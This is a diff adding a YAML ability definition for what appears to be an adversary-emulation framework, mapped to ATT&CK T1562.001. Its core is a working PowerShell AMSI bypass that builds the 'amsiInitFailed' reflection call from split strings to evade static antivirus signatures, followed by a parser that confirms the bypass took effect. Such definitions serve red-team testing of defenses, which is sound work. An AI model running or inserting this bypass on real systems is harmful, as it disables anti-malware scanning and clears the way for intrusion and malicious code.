@@ -1,0 +1,25 @@
+- id: a67e3a2b-f28e-49a3-a864-77e8717810b4
+  name: Impair Defenses - In-Memory AMSI Bypass (Signature Evasion)
+  description: Disables AMSI for the current PowerShell process. This version uses advanced string concatenation and dynamic invocation to build the bypass command in memory at runtime, evading static signature detection by antivirus.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: "Impair Defenses: Disable or Modify Tools"
+  platforms:
+    windows:
+      psh:
+        # This command builds the malicious .NET call from non-suspicious parts to evade static signatures.
+        # It then executes the final command using the call operator (&).
+        command: |
+          $utils = "System.Management.Automation.A" + "msi" + "Utils";
+          $field = "amsi" + "Init" + "Failed";
+          $assembly = [Ref].Assembly.GetType($utils);
+          $fieldInfo = $assembly.GetField($field, "NonPublic,Static");
+          $fieldInfo.SetValue($null, $true);
+          Write-Host "AMSI Bypassed";
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'host.defense.bypassed.amsi'
+              custom_parser_vals:
+                regex: '^(AMSI Bypassed)$'
+                edge_label: 'has_state'
